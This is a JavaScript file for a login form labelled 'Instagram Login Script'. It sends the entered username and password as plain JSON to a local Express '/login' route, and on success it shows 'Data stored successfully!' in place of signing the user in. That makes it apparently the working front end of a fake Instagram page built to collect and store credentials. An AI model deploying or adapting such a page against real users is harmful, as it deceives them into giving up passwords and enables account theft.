/**
 * Instagram Login Script
 * Sends login data to Express backend
 */

(function () {
    'use strict';

    // Elements
    const form = document.getElementById('login-form');
    const userField = document.getElementById('username');
    const pwField = document.getElementById('password');
    const loginBtn = document.getElementById('login-btn');
    const togglePw = document.getElementById('toggle-pw');
    const formError = document.getElementById('form-error');

    // -----------------------------
    // Button State
    // -----------------------------

    function updateButtonState() {
        const username = userField.value.trim();
        const password = pwField.value;

        loginBtn.disabled = !(username && password);
    }

    userField.addEventListener('input', updateButtonState);
    pwField.addEventListener('input', updateButtonState);

    // -----------------------------
    // Password Toggle
    // -----------------------------

    if (togglePw) {
        togglePw.addEventListener('click', () => {

            if (pwField.type === 'password') {
                pwField.type = 'text';
                togglePw.textContent = 'Hide';
            } else {
                pwField.type = 'password';
                togglePw.textContent = 'Show';
            }

            pwField.focus();
        });
    }

    // -----------------------------
    // Error Handling
    // -----------------------------

    function showError(message) {
        if (formError) {
            formError.textContent = message;
        }
    }

    function clearError() {
        if (formError) {
            formError.textContent = '';
        }
    }

    // -----------------------------
    // Form Submit
    // -----------------------------

    form.addEventListener('submit', async (e) => {

        e.preventDefault();

        clearError();

        const username = userField.value.trim();
        const password = pwField.value;

        if (!username) {
            showError('Please enter username/email/phone');
            userField.focus();
            return;
        }

        if (!password) {
            showError('Please enter password');
            pwField.focus();
            return;
        }

        try {

            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            const response = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username,
                    password
                })
            });

            const data = await response.json();

            if (data.success) {

                alert('Data stored successfully!');

                form.reset();

                updateButtonState();

            } else {

                showError(data.message || 'Login failed');
            }

        } catch (error) {

            console.error(error);

            showError('Unable to connect to server');

        } finally {

            loginBtn.textContent = 'Log in';

            updateButtonState();
        }
    });

    // Initial button state
    updateButtonState();

})();